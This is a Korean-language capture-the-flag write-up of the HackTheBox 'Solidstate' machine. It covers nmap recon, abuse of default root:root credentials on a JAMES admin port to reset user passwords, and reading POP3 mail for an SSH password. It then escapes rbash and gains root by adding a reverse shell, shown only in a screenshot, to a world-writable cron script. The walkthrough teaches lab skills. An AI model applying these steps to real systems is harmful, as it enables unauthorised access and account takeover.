# Solidstate - HackTheBox
## Recon
```bash
sudo nmap -p 22,25,80,110,119,4555 -sC -sV -vv -oA SolidState 10.129.17.55
```
<img width="1105" height="391" alt="image" src="https://github.com/user-attachments/assets/4fb44a41-04cb-4352-87ae-09065d5f3ea7" />

- SSH(22)
- SMTP(25)
- HTTP(80)
- POP3(110)
- UNKNOWN(4555)

---
## UNKOWN PORT(4555)
- `JAMES Remote Administration Tool 2.3.2`
```bash
nc -nv 10.129.17.55 4555
```
<img width="1105" height="121" alt="image" src="https://github.com/user-attachments/assets/33931625-0adf-4ed7-aa08-6c55dc7d1c30" />

<br>
<br>

- 기본 계정인 `root:root`로 로그인하여 유저 리스트 확인.
```
listusers
```
<img width="1105" height="228" alt="image" src="https://github.com/user-attachments/assets/d5b1efdf-61f5-4462-8ab2-da9b719704ab" />

<br>
<br>

- 유저들의 비밀번호를 전부 `password`로 수정.
```
setpassword james password

setpassword thomas password

setpassword john password

setpassword mindy password

setpassword mailadmin password
```
<img width="1105" height="192" alt="image" src="https://github.com/user-attachments/assets/3859b9bd-1210-448c-9929-180c26af29c5" />

<br>
<br>

- `POP3`에 접속하여 메일 확인.
- `mindy`유저의 계정 발견.
```
telnet 10.129.17.55 110

user mindy

pass password

list

retr 2
```
<img width="1103" height="540" alt="image" src="https://github.com/user-attachments/assets/c7118bf7-5385-4c5c-b889-957011594cc2" />

<br>
<br>

- `mindy:P@55W0rd1!2@` SSH 로그인.
- 접속은 하였으나 제한된 셸.
<img width="1103" height="421" alt="image" src="https://github.com/user-attachments/assets/2517206a-3786-4bee-9631-234c8f041d7e" />

<br>
<br>

- https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
- 사용할 수 있는 명령어가 한정적이여서 SSH로 `rbash` 탈출.
```bash
ssh mindy@10.129.17.55 -t "bash"
```
<img width="1103" height="101" alt="image" src="https://github.com/user-attachments/assets/864020ff-11b4-47e6-8343-c11e521a4c89" />

---
## Privesc
- `/tmp`의 파일들을 제거하는 `/opt/tmp.py`스크립트를 발견.
<img width="1103" height="278" alt="image" src="https://github.com/user-attachments/assets/7caca250-bdf7-48b4-9a22-f2517ffa4bdc" />

<br>
<br>

- `/tmp`에 파일 생성.
<img width="1103" height="59" alt="image" src="https://github.com/user-attachments/assets/6e8bc02b-fce5-4637-a63a-42d061a87344" />

<br>
<br>

- 얼마동안의 시간이 지난 뒤에 확인해보니 사라진 것을 확인.
<img width="1103" height="39" alt="image" src="https://github.com/user-attachments/assets/6252ca90-58ac-4586-aa9a-08407cb47e87" />

<br>
<br>

- 주기적으로 스크립트가 실행된다 가정하고 리버스 셸 명령어를 `tmp.py`에 추가.(모든 유저가 수정할 수 있는 권한을 가지고 있음.)
<img width="1103" height="230" alt="image" src="https://github.com/user-attachments/assets/db0acaff-206e-4333-a672-7cde86c57709" />

<br>
<br>

- 셸 획득.
<img width="1103" height="177" alt="image" src="https://github.com/user-attachments/assets/7da087e6-3123-4d0c-bdd1-9b2d64e5a2a2" />

---
## FLAG
- `/home/mindy/user.txt`
<img width="1103" height="270" alt="image" src="https://github.com/user-attachments/assets/51d3ed3d-591e-41f5-bdf7-2ceca058fada" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="325" alt="image" src="https://github.com/user-attachments/assets/bcd898cd-346e-4ead-8ca6-9b038a9eea18" />
